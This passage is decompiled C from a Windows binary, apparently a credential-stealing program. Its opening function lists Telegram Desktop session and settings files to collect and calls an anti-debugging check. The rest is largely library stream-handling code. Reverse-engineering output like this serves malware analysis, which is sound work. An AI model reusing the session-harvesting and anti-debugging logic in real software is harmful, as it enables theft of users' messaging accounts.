    (*_DAT_003d9520)(local_11c,&DAT_003d108c);
    (*_DAT_003d9520)(local_11c,&DAT_003d1630);
    (*_DAT_003d9520)(local_11c,&DAT_003d0e40);
    (*_DAT_003d9520)(local_11c,&DAT_003d0e48);
    (*_DAT_003d9520)(local_11c,&DAT_003d1634);
    (*_DAT_003d9520)(local_11c,&DAT_003d0e44);
    (*_DAT_003d9520)(local_11c,&DAT_003d1600);
    (*_DAT_003d9520)(local_11c,&DAT_003d15f8);
    (*_DAT_003d9520)(local_11c,&DAT_003ce7fc);
    (*_DAT_003d9520)(local_32c,&DAT_003d1634);
    (*_DAT_003d9520)(local_32c,&DAT_003d0e40);
    (*_DAT_003d9520)(local_32c,&DAT_003d1638);
    (*_DAT_003d9520)(local_32c,&DAT_003d103c);
    (*_DAT_003d9520)(local_32c,&DAT_003d163c);
    (*_DAT_003d9520)(local_32c,&DAT_003d0e38);
    (*_DAT_003d9520)(local_32c,&DAT_003d0e44);
    (*_DAT_003d9520)(local_32c,&DAT_003d0e38);
    (*_DAT_003d9520)(local_32c,&DAT_003d0e48);
    (*_DAT_003d9520)(local_224,&DAT_003d1630);
    (*_DAT_003d9520)(local_224,&DAT_003d1640);
    (*_DAT_003d9520)(local_224,&DAT_003d1644);
    (*_DAT_003d9520)(local_224,&DAT_003d1644);
    (*_DAT_003d9520)(local_224,&DAT_003d1648);
    (*_DAT_003d9520)(local_224,&DAT_003d1644);
    (*_DAT_003d9520)(local_224,&DAT_003d1640);
    (*_DAT_003d9520)(local_224,&DAT_003d164c);
    (*_DAT_003d9520)(local_224,&DAT_003d1630);
    (*_DAT_003d9520)(local_224,&DAT_003d1650);
    (*_DAT_003d9520)(local_224,&DAT_003d1630);
    (*_DAT_003d9520)(local_224,&DAT_003d164c);
    (*_DAT_003d9520)(local_224,&DAT_003d1654);
    (*_DAT_003d9520)(local_224,&DAT_003d1648);
    (*_DAT_003d9520)(local_224,&DAT_003d1640);
    (*_DAT_003d9520)(local_224,&DAT_003d0f98);
    (*_DAT_003d9520)(local_224,&DAT_003d0f94);
    FUN_0039dbd0(this,&DAT_003ce656,local_11c,local_32c,"Telegram");
    FUN_0039dbd0(this,&DAT_003ce656,local_11c,local_224,"Telegram");
    uStack101820 = 0xf;
    uStack101824 = 0;
    apvStack101840[0] = (void *)((uint)apvStack101840[0] & 0xffffff00);
    piVar3 = (int *)_strlen("p*");
    FUN_003894c0(apvStack101840,(int **)&DAT_003d1664,piVar3);
    local_8 = 0;
    puVar4 = (undefined4 *)FUN_00389b30(apvStack101868,apvStack101840);
    local_8 = CONCAT31(local_8._1_3_,1);
    if (0xf < (uint)puVar4[5]) {
      puVar4 = (undefined4 *)*puVar4;
    }
    FUN_0039dbd0(this,&DAT_003ce656,local_11c,puVar4,"Telegram");
    if (0xf < uStack101848) {
      FUN_003aee4b(apvStack101868[0]);
    }
    local_8 = 0xffffffff;
    uStack101848 = 0xf;
    uStack101852 = 0;
    apvStack101868[0] = (void *)((uint)apvStack101868[0] & 0xffffff00);
    if (0xf < uStack101820) {
      FUN_003aee4b(apvStack101840[0]);
    }
    uStack101820 = 0xf;
    uStack101824 = 0;
    apvStack101840[0] = (void *)((uint)apvStack101840[0] & 0xffffff00);
    piVar3 = (int *)_strlen("BC10B77*");
    FUN_003894c0(apvStack101840,(int **)"BC10B77*",piVar3);
    local_8 = 2;
    puVar4 = (undefined4 *)FUN_00389b30(apvStack101868,apvStack101840);
    local_8 = CONCAT31(local_8._1_3_,3);
    if (0xf < (uint)puVar4[5]) {
      puVar4 = (undefined4 *)*puVar4;
    }
    FUN_0039dbd0(this,&DAT_003ce656,local_11c,puVar4,"Telegram");
    if (0xf < uStack101848) {
      FUN_003aee4b(apvStack101868[0]);
    }
    local_8 = 0xffffffff;
    uStack101848 = 0xf;
    uStack101852 = 0;
    apvStack101868[0] = (void *)((uint)apvStack101868[0] & 0xffffff00);
    if (0xf < uStack101820) {
      FUN_003aee4b(apvStack101840[0]);
    }
    uStack101820 = 0xf;
    uStack101824 = 0;
    apvStack101840[0] = (void *)((uint)apvStack101840[0] & 0xffffff00);
    piVar3 = (int *)_strlen("A6F891F2*");
    FUN_003894c0(apvStack101840,(int **)"A6F891F2*",piVar3);
    local_8 = 4;
    puVar4 = (undefined4 *)FUN_00389b30(apvStack101868,apvStack101840);
    local_8 = CONCAT31(local_8._1_3_,5);
    if (0xf < (uint)puVar4[5]) {
      puVar4 = (undefined4 *)*puVar4;
    }
    FUN_0039dbd0(this,&DAT_003ce656,local_11c,puVar4,"Telegram");
    if (0xf < uStack101848) {
      FUN_003aee4b(apvStack101868[0]);
    }
    local_8 = 0xffffffff;
    uStack101848 = 0xf;
    uStack101852 = 0;
    apvStack101868[0] = (void *)((uint)apvStack101868[0] & 0xffffff00);
    if (0xf < uStack101820) {
      FUN_003aee4b(apvStack101840[0]);
    }
    uStack101876 = 0xf;
    uStack101880 = 0;
    apvStack101896[0] = (void *)((uint)apvStack101896[0] & 0xffffff00);
    piVar3 = (int *)_strlen("C461824F*");
    FUN_003894c0(apvStack101896,(int **)"C461824F*",piVar3);
    local_8 = 6;
    puVar4 = (undefined4 *)FUN_00389b30(apvStack101924,apvStack101896);
    local_8 = CONCAT31(local_8._1_3_,7);
    if (0xf < (uint)puVar4[5]) {
      puVar4 = (undefined4 *)*puVar4;
    }
    FUN_0039dbd0(this,&DAT_003ce656,local_11c,puVar4,"Telegram");
    if (0xf < uStack101904) {
      FUN_003aee4b(apvStack101924[0]);
    }
    local_8 = 0xffffffff;
    uStack101904 = 0xf;
    uStack101908 = 0;
    apvStack101924[0] = (void *)((uint)apvStack101924[0] & 0xffffff00);
    if (0xf < uStack101876) {
      FUN_003aee4b(apvStack101896[0]);
    }
    uStack101876 = 0xf;
    uStack101880 = 0;
    apvStack101896[0] = (void *)((uint)apvStack101896[0] & 0xffffff00);
    FUN_0039dbd0(this,&DAT_003ce656,local_11c,"countries","Telegram");
    FUN_0039dbd0(this,&DAT_003ce656,local_11c,"prefix","Telegram");
    FUN_0039dbd0(this,&DAT_003ce656,local_11c,"settingss","Telegram");
    FUN_0039dbd0(this,&DAT_003ce656,local_11c,"shortcuts-custom.json","Telegram");
    FUN_0039dbd0(this,&DAT_003ce656,local_11c,"shortcuts-default.json","Telegram");
    FUN_0039dbd0(this,&DAT_003ce656,local_11c,"usertag","Telegram");
  }
  uVar1 = DAT_003d9338;
  *(undefined4 *)((int)this + 0xc) = DAT_003d932c;
  *(undefined4 *)((int)this + 0x10) = uVar1;
  iVar2 = (*_DAT_003d9418)(auStack101812);
  piVar3 = *(int **)((int)this + 0x20);
  if (piVar3 == (int *)0x0) {
    _DAT_003d9814 = 0x10000;
  }
  else {
    if (*piVar3 == 2) {
      _DAT_003d9814 = FUN_003ad750((char **)piVar3[1],(int)auStack101812,DAT_003d9124,iVar2,3);
    }
    else {
      _DAT_003d9814 = 0x80000;
    }
  }
  trim_string((undefined (*) [16])auStack101812,0,100000);
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,extraout_EDX,unaff_BL);
  return;
}



void __fastcall FUN_003a1790(int **param_1)

{
  int *in_EAX;
  undefined *unaff_ESI;
  
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *unaff_ESI = 0;
  FUN_003894c0(unaff_ESI,param_1,in_EAX);
  return;
}



void FUN_003a17b0(void)

{
  int *piVar1;
  int **ppiVar2;
  int *extraout_ECX;
  int *extraout_ECX_00;
  int *piVar3;
  undefined unaff_BL;
  int **unaff_ESI;
  
  piVar3 = unaff_ESI[4];
  if (-(int)piVar3 - 1U < 2) {
    FUN_003ae350("string too long");
    piVar3 = extraout_ECX;
  }
  piVar1 = (int *)((int)piVar3 + 1);
  if (piVar1 == (int *)0xffffffff) {
    FUN_003ae350("string too long");
    piVar3 = extraout_ECX_00;
  }
  if (unaff_ESI[5] < piVar1) {
    FUN_00389950(unaff_ESI,piVar1,piVar3);
    if (piVar1 == (int *)0x0) {
      return;
    }
  }
  else {
    if (piVar1 == (int *)0x0) {
      unaff_ESI[4] = (int *)0x0;
      if ((int *)0xf < unaff_ESI[5]) {
        *(undefined *)*unaff_ESI = 0;
        return;
      }
      *(undefined *)unaff_ESI = 0;
      return;
    }
  }
  ppiVar2 = unaff_ESI;
  if ((int *)0xf < unaff_ESI[5]) {
    ppiVar2 = (int **)*unaff_ESI;
  }
  *(undefined *)((int)ppiVar2 + (int)unaff_ESI[4]) = unaff_BL;
  unaff_ESI[4] = piVar1;
  if (unaff_ESI[5] < (int *)0x10) {
    *(undefined *)((int)unaff_ESI + (int)piVar1) = 0;
    return;
  }
  *(undefined *)((int)*unaff_ESI + (int)piVar1) = 0;
  return;
}



void FUN_003a1860(void)

{
  int iVar1;
  void *this;
  int *unaff_ESI;
  uint uVar2;
  
  uVar2 = 0;
  if ((*(byte *)(*(int *)(*unaff_ESI + 4) + 0xc + (int)unaff_ESI) & 6) == 0) {
    iVar1 = (**(code **)(**(int **)(*(int *)(*unaff_ESI + 4) + 0x38 + (int)unaff_ESI) + 0x34))();
    if (iVar1 == -1) {
      uVar2 = 4;
    }
  }
  this = (void *)(*(int *)(*unaff_ESI + 4) + (int)unaff_ESI);
  if (uVar2 != 0) {
    uVar2 = *(uint *)((int)this + 0xc) | uVar2;
    if (*(int *)((int)this + 0x38) == 0) {
      uVar2 = uVar2 | 4;
    }
    *(uint *)((int)this + 0xc) = uVar2 & 0x17;
    if ((*(uint *)((int)this + 0x10) & uVar2 & 0x17) != 0) {
      FUN_00399780(this,(char *)0x0);
    }
  }
  return;
}



void __fastcall FUN_003a18e0(undefined **param_1)

{
  uint *puVar1;
  uint uVar2;
  int iVar3;
  code **ppcVar4;
  int local_c;
  undefined **local_8;
  
  puVar1 = (uint *)param_1[0xe];
  *param_1 = (undefined *)std::basic_streambuf<char,struct_std::char_traits<char>_>::vftable;
  local_8 = param_1;
  if (puVar1 != (uint *)0x0) {
    uVar2 = *puVar1;
    if (uVar2 != 0) {
      std::_Lockit::_Lockit((_Lockit *)&local_c,0);
      iVar3 = *(int *)(uVar2 + 4);
      if ((iVar3 != 0) && (iVar3 != -1)) {
        *(int *)(uVar2 + 4) = iVar3 + -1;
      }
      iVar3 = *(int *)(uVar2 + 4);
      FUN_003ae995(&local_c);
      ppcVar4 = (code **)(~-(uint)(iVar3 != 0) & uVar2);
      if (ppcVar4 != (code **)0x0) {
        (**(code **)*ppcVar4)(1);
      }
    }
    param_1 = local_8;
    FUN_003aee4b(puVar1);
  }
  FUN_003ae9c6((LPCRITICAL_SECTION *)(param_1 + 1));
  return;
}



uint FUN_003a1960(void)

{
  int *piVar1;
  int *in_EAX;
  byte *pbVar2;
  uint uVar3;
  
  if (*(int *)in_EAX[8] != 0) {
    if (1 < *(int *)in_EAX[0xc]) {
      *(int *)in_EAX[0xc] = *(int *)in_EAX[0xc] + -1;
      pbVar2 = *(byte **)in_EAX[8] + 1;
      *(byte **)in_EAX[8] = pbVar2;
      return (uint)*pbVar2;
    }
    if ((*(int *)in_EAX[8] != 0) && (piVar1 = (int *)in_EAX[0xc], 0 < *piVar1)) {
      *piVar1 = *piVar1 + -1;
      pbVar2 = *(byte **)in_EAX[8];
      *(byte **)in_EAX[8] = pbVar2 + 1;
      uVar3 = (uint)*pbVar2;
      goto LAB_003a19b0;
    }
  }
  uVar3 = (**(code **)(*in_EAX + 0x1c))();
LAB_003a19b0:
  if (uVar3 == 0xffffffff) {
    return 0xffffffff;
  }
  if ((*(byte **)in_EAX[8] != (byte *)0x0) && (0 < *(int *)in_EAX[0xc])) {
    return (uint)**(byte **)in_EAX[8];
  }
                    // WARNING: Could not recover jumptable at 0x003a19d8. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar3 = (**(code **)(*in_EAX + 0x18))();
  return uVar3;
}



void __fastcall FUN_003a19e0(int param_1)

{
  __Mtxlock(*(_Rmtx **)(param_1 + 4));
  return;
}



void __fastcall FUN_003a19f0(int param_1)

{
  FUN_003aede8(*(LPCRITICAL_SECTION *)(param_1 + 4));
  return;
}



undefined4 FUN_003a1a00(void)

{
  return 0xffffffff;
}



undefined8 FUN_003a1a10(void)

{
  return 0;
}



undefined4 FUN_003a1a20(void)

{
  return 0xffffffff;
}



uint __fastcall FUN_003a1a30(int *param_1)

{
  byte *pbVar1;
  int iVar2;
  
  iVar2 = (**(code **)(*param_1 + 0x18))();
  if (iVar2 == -1) {
    return 0xffffffff;
  }
  *(int *)param_1[0xc] = *(int *)param_1[0xc] + -1;
  pbVar1 = *(byte **)param_1[8];
  *(byte **)param_1[8] = pbVar1 + 1;
  return (uint)*pbVar1;
}



// WARNING: Removing unreachable block (ram,0x003a1aa1)
// WARNING: Removing unreachable block (ram,0x003a1aae)

longlong __thiscall FUN_003a1a60(void *this,undefined4 *param_1,uint param_2,int param_3)

{
  longlong lVar1;
  int iVar2;
  uint uVar3;
  bool bVar4;
  longlong lVar5;
  
  if ((-1 < param_3) && ((lVar1 = 0, 0 < param_3 || (lVar1 = 0, param_2 != 0)))) {
    while( true ) {
      do {
        lVar5 = FUN_003a29c0();
        if (lVar5 < 1) {
                    // WARNING: Load size is inaccurate
          iVar2 = (**(code **)(*this + 0x1c))();
          if (iVar2 == -1) {
            return lVar1;
          }
          *(char *)param_1 = (char)iVar2;
          lVar1 = lVar1 + 1;
          bVar4 = param_2 != 0;
          param_2 = param_2 - 1;
          param_3 = param_3 + -1 + (uint)bVar4;
          param_1 = (undefined4 *)((int)param_1 + 1);
        }
        else {
          if (CONCAT44(param_3,param_2) < lVar5) {
            lVar5 = CONCAT44(param_3,param_2);
          }
          uVar3 = (uint)lVar5;
          FUN_003aee70(param_1,(undefined4 *)**(undefined4 **)((int)this + 0x20),uVar3);
          lVar1 = lVar5 + lVar1;
          bVar4 = param_2 < uVar3;
          param_2 = param_2 - uVar3;
          param_3 = (param_3 - (int)((ulonglong)lVar5 >> 0x20)) - (uint)bVar4;
          **(int **)((int)this + 0x30) = **(int **)((int)this + 0x30) - uVar3;
          **(int **)((int)this + 0x20) = **(int **)((int)this + 0x20) + uVar3;
          param_1 = (undefined4 *)((int)param_1 + uVar3);
        }
      } while (0 < param_3);
      if (param_3 < 0) break;
      if (param_2 == 0) {
        return lVar1;
      }
    }
    return lVar1;
  }
  return 0;
}



// WARNING: Removing unreachable block (ram,0x003a1b81)
// WARNING: Removing unreachable block (ram,0x003a1b8e)

longlong __thiscall FUN_003a1b40(void *this,undefined4 *param_1,uint param_2,int param_3)

{
  longlong lVar1;
  int iVar2;
  uint uVar3;
  bool bVar4;
  longlong lVar5;
  
  if ((-1 < param_3) && ((lVar1 = 0, 0 < param_3 || (lVar1 = 0, param_2 != 0)))) {
    while( true ) {
      do {
        lVar5 = FUN_003a29e0();
        if (lVar5 < 1) {
                    // WARNING: Load size is inaccurate
          iVar2 = (**(code **)(*this + 0xc))(*(undefined *)param_1);
          if (iVar2 == -1) {
            return lVar1;
          }
          param_1 = (undefined4 *)((int)param_1 + 1);
          lVar1 = lVar1 + 1;
          bVar4 = param_2 != 0;
          param_2 = param_2 - 1;
          param_3 = param_3 + -1 + (uint)bVar4;
        }
        else {
          if (CONCAT44(param_3,param_2) < lVar5) {
            lVar5 = CONCAT44(param_3,param_2);
          }
          uVar3 = (uint)lVar5;
          FUN_003aee70((undefined4 *)**(undefined4 **)((int)this + 0x24),param_1,uVar3);
          param_1 = (undefined4 *)((int)param_1 + uVar3);
          lVar1 = lVar5 + lVar1;
          bVar4 = param_2 < uVar3;
          param_2 = param_2 - uVar3;
          param_3 = (param_3 - (int)((ulonglong)lVar5 >> 0x20)) - (uint)bVar4;
          **(int **)((int)this + 0x34) = **(int **)((int)this + 0x34) - uVar3;
          **(int **)((int)this + 0x24) = **(int **)((int)this + 0x24) + uVar3;
        }
      } while (0 < param_3);
      if (param_3 < 0) break;
      if (param_2 == 0) {
        return lVar1;
      }
    }
    return lVar1;
  }
  return 0;
}



void FUN_003a1c20(undefined4 *param_1)

{
  *param_1 = 0xffffffff;
  param_1[1] = 0xffffffff;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  return;
}



void FUN_003a1c50(undefined4 *param_1)

{
  *param_1 = 0xffffffff;
  param_1[1] = 0xffffffff;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  return;
}



undefined4 __fastcall FUN_003a1c80(undefined4 param_1)

{
  return param_1;
}



undefined4 FUN_003a1c90(void)

{
  return 0;
}



void FUN_003a1ca0(void)

{
  return;
}



// WARNING: Could not reconcile some variable overlaps

undefined ** FUN_003a1cb0(undefined **param_1,char *param_2)

{
  undefined **ppuVar1;
  undefined *puVar2;
  undefined uVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  void *pvVar7;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c3d32;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  *param_1 = (undefined *)&PTR_003d17b8;
  param_1[0x1a] = (undefined *)std::basic_ios<char,struct_std::char_traits<char>_>::vftable;
  local_8 = 0;
  *(undefined ***)((int)param_1 + *(int *)(*param_1 + 4)) =
       std::basic_istream<char,struct_std::char_traits<char>_>::vftable;
  param_1[2] = (undefined *)0x0;
  param_1[3] = (undefined *)0x0;
  pvVar7 = (void *)(*(int *)(*param_1 + 4) + (int)param_1);
  FUN_00399890();
  ppuVar1 = param_1 + 4;
  *(undefined ***)((int)pvVar7 + 0x38) = ppuVar1;
  *(undefined4 *)((int)pvVar7 + 0x3c) = 0;
  uVar3 = FUN_003a2fa0((uint)pvVar7,0x20);
  *(undefined *)((int)pvVar7 + 0x40) = uVar3;
  if ((*(int *)((int)pvVar7 + 0x38) == 0) &&
     (uVar4 = *(uint *)((int)pvVar7 + 0xc) & 0x17 | 4, *(uint *)((int)pvVar7 + 0xc) = uVar4,
     (*(uint *)((int)pvVar7 + 0x10) & uVar4) != 0)) {
    FUN_00399780(pvVar7,(char *)0x0);
  }
  local_8 = 2;
  *(undefined ***)((int)param_1 + *(int *)(*param_1 + 4)) =
       std::basic_ifstream<char,struct_std::char_traits<char>_>::vftable;
  FUN_003a2e70(ppuVar1);
  param_1[8] = (undefined *)(param_1 + 6);
  param_1[0xc] = (undefined *)(param_1 + 10);
  param_1[0xd] = (undefined *)(param_1 + 0xb);
  *ppuVar1 = (undefined *)std::basic_filebuf<char,struct_std::char_traits<char>_>::vftable;
  *(undefined *)(param_1 + 0x18) = 0;
  *(undefined *)((int)param_1 + 0x59) = 0;
  param_1[9] = (undefined *)(param_1 + 7);
  param_1[0x10] = (undefined *)(param_1 + 0xe);
  param_1[0x11] = (undefined *)(param_1 + 0xf);
  param_1[7] = (undefined *)0x0;
  *(undefined4 *)param_1[0xd] = 0;
  *(undefined4 *)param_1[0x11] = 0;
  *(undefined4 *)param_1[8] = 0;
  puVar2 = DAT_003d9818;
  *(undefined4 *)param_1[0xc] = 0;
  *(undefined4 *)param_1[0x10] = 0;
  param_1[0x19] = (undefined *)0x0;
  param_1[0x17] = puVar2;
  param_1[0x15] = (undefined *)0x0;
  local_8 = CONCAT31(local_8._1_3_,3);
  iVar5 = FUN_003a2a00(param_2,(int)ppuVar1,1);
  if (iVar5 == 0) {
    uVar4 = *(uint *)(*(int *)(*param_1 + 4) + 0xc + (int)param_1);
    pvVar7 = (void *)(*(int *)(*param_1 + 4) + (int)param_1);
    uVar6 = uVar4 | 2;
    if (*(int *)((int)pvVar7 + 0x38) == 0) {
      uVar6 = uVar4 | 6;
    }
    *(uint *)((int)pvVar7 + 0xc) = uVar6 & 0x17;
    if ((*(uint *)((int)pvVar7 + 0x10) & uVar6 & 0x17) != 0) {
      FUN_00399780(pvVar7,(char *)0x0);
    }
  }
  *in_FS_OFFSET = local_10;
  return param_1;
}



// WARNING: Could not reconcile some variable overlaps

void __fastcall FUN_003a1e20(undefined4 *param_1)

{
  undefined **ppuVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c3203;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  puVar4 = *(undefined4 **)(param_1[-0x1a] + 4);
  *(undefined ***)((int)((int)puVar4 + -0x68) + (int)param_1) =
       std::basic_ifstream<char,struct_std::char_traits<char>_>::vftable;
  ppuVar1 = (undefined **)(param_1 + -0x16);
  *ppuVar1 = (undefined *)std::basic_filebuf<char,struct_std::char_traits<char>_>::vftable;
  local_8._0_1_ = 1;
  local_8._1_3_ = 0;
  puVar3 = param_1;
  if (param_1[-1] != 0) {
    puVar3 = (undefined4 *)param_1[-0x12];
    puVar4 = param_1 + -4;
    if ((undefined4 *)*puVar3 == puVar4) {
      uVar2 = param_1[-6];
      *puVar3 = param_1[-7];
      puVar3 = (undefined4 *)param_1[-0xe];
      *puVar3 = uVar2;
      puVar4 = (undefined4 *)param_1[-10];
      *puVar4 = 0;
    }
  }
  if (*(char *)(param_1 + -2) != '\0') {
    FUN_003a2aa0(puVar3,puVar4);
  }
  local_8 = (uint)local_8._1_3_ << 8;
  FUN_003a18e0(ppuVar1);
  *(undefined ***)(*(int *)(param_1[-0x1a] + 4) + -0x10 + (int)ppuVar1) =
       std::basic_istream<char,struct_std::char_traits<char>_>::vftable;
  *in_FS_OFFSET = local_10;
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  public: virtual void __thiscall std::basic_filebuf<char,struct
// std::char_traits<char>>::_Lock(void)
//  public: virtual void __thiscall std::basic_filebuf<unsigned short,struct
// std::char_traits<unsigned short>>::_Lock(void)
//  public: virtual void __thiscall std::basic_filebuf<wchar_t,struct
// std::char_traits<wchar_t>>::_Lock(void)
// 
// Library: Visual Studio 2010 Release

void __fastcall Lock(int param_1)

{
  if (*(FILE **)(param_1 + 0x54) != (FILE *)0x0) {
    __lock_file(*(FILE **)(param_1 + 0x54));
  }
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  public: virtual void __thiscall std::basic_filebuf<char,struct
// std::char_traits<char>>::_Unlock(void)
//  public: virtual void __thiscall std::basic_filebuf<unsigned short,struct
// std::char_traits<unsigned short>>::_Unlock(void)
//  public: virtual void __thiscall std::basic_filebuf<wchar_t,struct
// std::char_traits<wchar_t>>::_Unlock(void)
// 
// Library: Visual Studio 2010 Release

void __fastcall Unlock(int param_1)

{
  if (*(FILE **)(param_1 + 0x54) != (FILE *)0x0) {
    __unlock_file(*(FILE **)(param_1 + 0x54));
  }
  return;
}



void __fastcall FUN_003a1f80(int param_1,uint param_2,int param_3)

{
  uint uVar1;
  int *piVar2;
  char *pcVar3;
  undefined4 uVar4;
  uint uVar5;
  int iVar6;
  undefined4 ****ppppuVar7;
  size_t sVar8;
  uint extraout_EDX;
  uint extraout_EDX_00;
  uint extraout_EDX_01;
  uint extraout_EDX_02;
  uint extraout_EDX_03;
  char cVar9;
  size_t _Count;
  int **in_FS_OFFSET;
  char *in_stack_ffffffc4;
  int local_38;
  char local_31;
  undefined4 ****local_30 [4];
  uint local_20;
  uint local_1c;
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c31c8;
  local_10 = *in_FS_OFFSET;
  uVar5 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_14 = uVar5;
  if (param_3 != -1) {
    uVar1 = **(uint **)(param_1 + 0x24);
    cVar9 = (char)param_3;
    if (uVar1 != 0) {
      piVar2 = *(int **)(param_1 + 0x34);
      param_2 = *piVar2 + uVar1;
      if (uVar1 < param_2) {
        *piVar2 = *piVar2 + -1;
        pcVar3 = **(char ***)(param_1 + 0x24);
        **(char ***)(param_1 + 0x24) = pcVar3 + 1;
        *pcVar3 = cVar9;
        goto LAB_003a2141;
      }
    }
    if (*(int *)(param_1 + 0x54) != 0) {
      if (**(int **)(param_1 + 0x10) == param_1 + 0x48) {
        uVar4 = *(undefined4 *)(param_1 + 0x40);
        **(int **)(param_1 + 0x10) = *(int *)(param_1 + 0x3c);
        **(undefined4 **)(param_1 + 0x20) = uVar4;
        **(undefined4 **)(param_1 + 0x30) = 0;
      }
      if (*(int *)(param_1 + 0x44) != 0) {
        local_31 = cVar9;
        FUN_003a28c0();
        local_8 = 0;
LAB_003a2050:
        ppppuVar7 = local_30[0];
        if (local_1c < 0x10) {
          ppppuVar7 = local_30;
        }
        iVar6 = (**(code **)(**(int **)(param_1 + 0x44) + 0x14))
                          (param_1 + 0x4c,&local_31,local_30,&stack0xffffffc4,ppppuVar7,
                           (int)ppppuVar7 + local_20,&local_38,uVar5);
        if (iVar6 < 0) goto LAB_003a2136;
        if (iVar6 < 2) {
          ppppuVar7 = local_30[0];
          if (local_1c < 0x10) {
            ppppuVar7 = local_30;
          }
          _Count = local_38 - (int)ppppuVar7;
          if (_Count != 0) {
            ppppuVar7 = local_30[0];
            if (local_1c < 0x10) {
              ppppuVar7 = local_30;
            }
            sVar8 = _fwrite(ppppuVar7,1,_Count,*(FILE **)(param_1 + 0x54));
            if (_Count != sVar8) goto LAB_003a2136;
          }
          *(undefined *)(param_1 + 0x49) = 1;
          if (in_stack_ffffffc4 == &local_31) goto code_r0x003a20d1;
          FUN_00389360(local_30);
          param_2 = extraout_EDX_02;
        }
        else {
          if (iVar6 != 3) goto LAB_003a2136;
          iVar6 = FID_conflict__fputc((int)local_31,*(FILE **)(param_1 + 0x54));
          if (iVar6 == -1) {
            FUN_00389360(local_30);
            param_2 = extraout_EDX_01;
          }
          else {
            FUN_00389360(local_30);
            param_2 = extraout_EDX_00;
          }
        }
        goto LAB_003a2141;
      }
      FID_conflict__fputc((int)cVar9,*(FILE **)(param_1 + 0x54));
      param_2 = extraout_EDX;
    }
  }
LAB_003a2141:
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,param_2,(char)in_stack_ffffffc4);
  return;
code_r0x003a20d1:
  if (_Count == 0) {
    if (0x1f < local_20) {
LAB_003a2136:
      FUN_00389360(local_30);
      param_2 = extraout_EDX_03;
      goto LAB_003a2141;
    }
    FUN_00396020(0);
  }
  goto LAB_003a2050;
}



uint __thiscall FUN_003a2160(void *this,uint param_1)

{
  uint uVar1;
  int iVar2;
  
  uVar1 = **(uint **)((int)this + 0x20);
  if (((uVar1 != 0) && (**(uint **)((int)this + 0x10) < uVar1)) &&
     ((param_1 == 0xffffffff || (*(byte *)(uVar1 - 1) == param_1)))) {
    **(int **)((int)this + 0x30) = **(int **)((int)this + 0x30) + 1;
    **(int **)((int)this + 0x20) = **(int **)((int)this + 0x20) + -1;
    return -(uint)(param_1 != 0xffffffff) & param_1;
  }
  if ((*(FILE **)((int)this + 0x54) != (FILE *)0x0) && (param_1 != 0xffffffff)) {
    if ((*(int *)((int)this + 0x44) == 0) &&
       (iVar2 = _ungetc(param_1 & 0xff,*(FILE **)((int)this + 0x54)), iVar2 != -1)) {
      return param_1;
    }
    if ((undefined *)**(int **)((int)this + 0x20) != (undefined *)((int)this + 0x48)) {
      *(undefined *)((int)this + 0x48) = (char)param_1;
      FUN_003a2da0();
      return param_1;
    }
  }
  return 0xffffffff;
}



uint __fastcall FUN_003a21f0(int *param_1)

{
  byte *pbVar1;
  uint uVar2;
  
  pbVar1 = *(byte **)param_1[8];
  if ((pbVar1 != (byte *)0x0) && (pbVar1 < pbVar1 + *(int *)param_1[0xc])) {
    return (uint)*pbVar1;
  }
  uVar2 = (**(code **)(*param_1 + 0x1c))();
  if (uVar2 == 0xffffffff) {
    return 0xffffffff;
  }
  (**(code **)(*param_1 + 0x10))(uVar2);
  return uVar2;
}



void __fastcall FUN_003a2240(int param_1)

{
  void *pvVar1;
  undefined4 uVar2;
  uint uVar3;
  int iVar4;
  undefined4 ***pppuVar5;
  int iVar6;
  int extraout_EDX;
  int extraout_EDX_00;
  int extraout_EDX_01;
  int extraout_EDX_02;
  int extraout_EDX_03;
  int **in_FS_OFFSET;
  undefined8 uVar7;
  undefined *in_stack_ffffffc0;
  undefined4 ***local_3c;
  int local_38;
  undefined local_31;
  undefined4 ***local_30 [4];
  void *local_20;
  void *local_1c;
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3198;
  local_10 = *in_FS_OFFSET;
  uVar3 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  iVar6 = 0;
  local_14 = uVar3;
  if ((**(int **)(param_1 + 0x20) == 0) ||
     (**(int **)(param_1 + 0x30) + **(uint **)(param_1 + 0x20) <= **(uint **)(param_1 + 0x20))) {
    if (*(int *)(param_1 + 0x54) != 0) {
      if (**(int **)(param_1 + 0x10) == param_1 + 0x48) {
        uVar2 = *(undefined4 *)(param_1 + 0x40);
        **(int **)(param_1 + 0x10) = *(int *)(param_1 + 0x3c);
        **(undefined4 **)(param_1 + 0x20) = uVar2;
        **(undefined4 **)(param_1 + 0x30) = 0;
      }
      if (*(int *)(param_1 + 0x44) == 0) {
        FID_conflict__getc(*(FILE **)(param_1 + 0x54));
        iVar6 = extraout_EDX;
      }
      else {
        local_1c = (void *)0xf;
        local_20 = (void *)0x0;
        local_30[0] = (undefined4 ***)((uint)local_30[0] & 0xffffff00);
        local_8 = 0;
        iVar6 = FID_conflict__getc(*(FILE **)(param_1 + 0x54));
        while (iVar6 != -1) {
          if ((-(int)local_20 - 1U < 2) ||
